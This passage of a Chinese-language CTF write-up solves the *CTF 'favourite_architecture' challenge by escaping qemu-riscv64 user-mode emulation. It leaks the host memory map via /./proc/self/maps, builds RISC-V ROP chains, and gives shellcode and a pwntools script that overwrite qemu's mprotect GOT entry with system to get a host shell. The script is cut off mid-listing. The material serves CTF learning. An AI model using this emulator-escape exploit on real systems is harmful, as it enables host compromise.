<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span>pwn<span class="o">)</span> pwn@ubuntu:~/share/starctf/favourite_architecture/share$ python ./exp2.py 
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./qemu-riscv64&#39;</span>: pid <span class="m">14856</span>
<span class="o">[</span>!<span class="o">]</span> ASLR is disabled!
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 You are wrong ._.
10000-6c000 r--p <span class="m">00000000</span> 00:38 <span class="m">19</span>                                       /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main
6c000-6f000 rw-p 0005b000 00:38 <span class="m">19</span>                                       /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main
6f000-93000 rw-p <span class="m">00000000</span> 00:00 <span class="m">0</span>                                        
4000000000-4000001000 ---p <span class="m">00000000</span> 00:00 <span class="m">0</span>                              
4000001000-4000801000 rw-p <span class="m">00000000</span> 00:00 <span class="m">0</span>                              <span class="o">[</span>stack<span class="o">]</span>
Input the flag: $ 
</code></pre></td></tr></table>
</div>
</div><p>读穿qemu模拟内存有三种方法</p>
<p>方法一：读的是/proc/self/syscall （By 0ops）</p>
<p>方法二：读/./proc/self/maps （By redbud）这种方法能直接读到整个真的vmmap（貌似qemu本身一直有这个洞&hellip;）</p>
<p>​			（没记错的话pwntools每次最多只能收0x1000个字符，顺着多读几次就能拿到完整的内存布局）</p>
<p>方法三：mmap一段已经存在的地址，把它挤到高地址处。（By sixstar）</p>
<p>​			根据mmap特性，如果要映射的内存已经在使用了，它会从与libc偏移固定的高地址处分配（0x7f&hellip;），进而得到libc_base</p>
<p>我们现在可以直接打qemu本体来getshell. 直接把qemu当做一般的elf来打，拿到本体的mprotect</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./qemu-riscv64&#34;</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/mnt/hgfs/linux_share/starctf/favourite_architecture/share/qemu-riscv64&#39;</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
    <span class="n">FORTIFY</span><span class="p">:</span>  <span class="n">Enabled</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">6959616</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">])</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="s1">&#39;0x6a3200&#39;</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> 
</code></pre></td></tr></table>
</div>
</div><p>利用方法一 (×)：利用risc-v本身的函数，不断ROP，比如0x1605a-&gt;printf_addr</p>
<p>我们可以测试一下，打印出qemu的puts@got与根据libc_base计算出的puts_addr对比</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># printf(puts@got)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;You are wrong ._.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;puts_addr : @&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;puts_addr : @&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
</code></pre></td></tr></table>
</div>
</div><p>确实是一致的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> puts_addr : @0x155554f075a0
<span class="o">[</span>+<span class="o">]</span> puts_addr : @0x155554f075a0
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
Input the flag: $ 
<span class="o">[</span>*<span class="o">]</span> Interrupted
<span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./qemu-riscv64&#39;</span> <span class="o">(</span>pid 15449<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>但也发现got表是不可写的，我们让这个0x3c00大小的段全部rwx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">555555bbc000-555555bf8000 r--p <span class="m">00468000</span> 00:38 <span class="m">18</span> 
/mnt/hgfs/linux_share/starctf/favourite_architecture/share/qemu-riscv64
</code></pre></td></tr></table>
</div>
</div><p>但是用risc-v自己的一些函数比如mprotect(0x0022ab0)只能操作属于risc-v的较低地址，暂时不明白原因&hellip;遂放弃</p>
<p>利用方法二 (√)：写shellcode，先让qumu的got表可写，然后改qemu的mprotect@got为system来getshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">int main() {
</span><span class="s1">    long long * libc_base,* qemu_base;
</span><span class="s1">
</span><span class="s1">    syscall(63,0,&amp;qemu_base,8);
</span><span class="s1">    syscall(63,0,&amp;libc_base,8);
</span><span class="s1">
</span><span class="s1">    long long * libc_system   =   libc_base + 349200/8;
</span><span class="s1">    long long * mprotect_got  =   qemu_base + 0x6a3200/8;
</span><span class="s1">    long long * ro_memory     =   qemu_base + 0x668000/8;
</span><span class="s1">
</span><span class="s1">    syscall(226,ro_memory,0x3c000,6);
</span><span class="s1">    * mprotect_got = (long long)  libc_system;
</span><span class="s1">    * ro_memory    = (long long)  0x6873;
</span><span class="s1">
</span><span class="s1">    syscall(226,ro_memory,0x3c000,6);
</span><span class="s1">
</span><span class="s1">}
</span><span class="s1">
</span><span class="s1">asm(
</span><span class="s1">    &#34;syscall:</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a7, a0</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a0, a1</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a1, a2</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a2, a3</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;ecall</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;ret</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">);
</span><span class="s1">&#39;&#39;&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>其中shellcode的编译选项如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">gen_shellcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shellcode.c&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">);</span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;riscv64-linux-gnu-gcc -e main -nostdlib  -Os -static shellcode.c -o shellcode&#34;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;riscv64-linux-gnu-objcopy --dump-section .text=sc.bin shellcode&#34;</span><span class="p">)</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sc.bin&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">);</span><span class="n">sc</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">();</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">sc</span>
</code></pre></td></tr></table>
</div>
</div><p>利用方法三 (√)：改malloc_hook为one_gadget，用writev来触发</p>
<p>完整exp如下，ubuntu2004复现成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ROP_ctrl</span><span class="p">(</span><span class="n">target_fn</span><span class="p">,</span> <span class="n">para1</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="n">para3</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x1179e</span><span class="p">,</span> 
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x470</span><span class="p">,</span> <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x478</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x11772</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="n">para3</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="n">para1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>  <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x1178e</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s0-s5</span>
                    <span class="n">main_addr</span><span class="p">,</span> <span class="c1"># ra</span>
                   <span class="p">)</span> 
    
    <span class="k">return</span> <span class="n">payload</span>

<span class="n">main_addr</span><span class="o">=</span><span class="mh">0x10400</span>
<span class="n">read_addr</span><span class="o">=</span><span class="mh">0x222ce</span>
<span class="n">open_addr</span><span class="o">=</span><span class="mh">0x221cc</span>
<span class="n">printf_addr</span><span class="o">=</span><span class="mh">0x1605a</span>
<span class="n">file_name</span><span class="o">=</span><span class="mh">0x6c120</span>
<span class="n">flag_addr</span><span class="o">=</span><span class="mh">0x6c110</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./qemu-riscv64&#34;</span><span class="p">,</span><span class="s2">&#34;./main&#34;</span><span class="p">])</span>
<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">file_name</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;/./proc/self/maps</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">open_addr</span><span class="p">,</span><span class="n">file_name</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># openat</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mh">0xf00</span><span class="p">)</span> <span class="c1"># read</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;qemu-riscv64&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">info</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
    <span class="k">if</span> <span class="s1">&#39;qemu-riscv64&#39;</span> <span class="ow">in</span> <span class="n">info</span><span class="p">:</span>
        <span class="n">qemu_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">info</span><span class="p">[:</span><span class="mi">12</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">success</span><span class="p">(</span><span class="s2">&#34;qemu_base : @&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">qemu_base</span><span class="p">))</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mh">0xf00</span><span class="p">)</span> <span class="c1"># read</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mh">0xf00</span><span class="p">)</span> <span class="c1"># read</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;libc&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">info</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
    <span class="k">if</span> <span class="s1">&#39;libc&#39;</span> <span class="ow">in</span> <span class="n">info</span><span class="p">:</span>
        <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">info</span><span class="p">[:</span><span class="mi">12</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base : @&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#39;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./qemu-riscv64&#39;</span><span class="p">)</span>
<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="n">mprotect_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">qemu_base</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">qemu_base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;malloc_hook : @&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="mh">0x0022ab0</span>

<span class="c1"># shellcode </span>
<span class="k">def</span> <span class="nf">gen_shellcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shellcode.c&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">);</span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;riscv64-linux-gnu-gcc -e main -nostdlib  -Os -static shellcode.c -o shellcode&#34;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;riscv64-linux-gnu-objcopy --dump-section .text=sc.bin shellcode&#34;</span><span class="p">)</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sc.bin&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">);</span><span class="n">sc</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">();</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">sc</span>

<span class="n">raw_input</span><span class="p">()</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">int main() {
</span><span class="s1">    long long * libc_base,* qemu_base;
</span><span class="s1">
</span><span class="s1">    syscall(63,0,&amp;qemu_base,8);
</span><span class="s1">    syscall(63,0,&amp;libc_base,8);
</span><span class="s1">
</span><span class="s1">    long long * libc_system   =   libc_base + 349200/8;
</span><span class="s1">    long long * mprotect_got  =   qemu_base + 0x6a3200/8;
</span><span class="s1">    long long * ro_memory     =   qemu_base + 0x668000/8;
</span><span class="s1">
</span><span class="s1">    syscall(226,ro_memory,0x3c000,6);
</span><span class="s1">    * mprotect_got = (long long)  libc_system;
</span><span class="s1">    * ro_memory    = (long long)  0x6873;
</span><span class="s1">
</span><span class="s1">    syscall(226,ro_memory,0x3c000,6);
</span><span class="s1">
</span><span class="s1">}
</span><span class="s1">
</span><span class="s1">asm(
</span><span class="s1">    &#34;syscall:</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a7, a0</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a0, a1</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a1, a2</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;mv a2, a3</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;ecall</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">    &#34;ret</span><span class="se">\\</span><span class="s1">n&#34;
</span><span class="s1">);
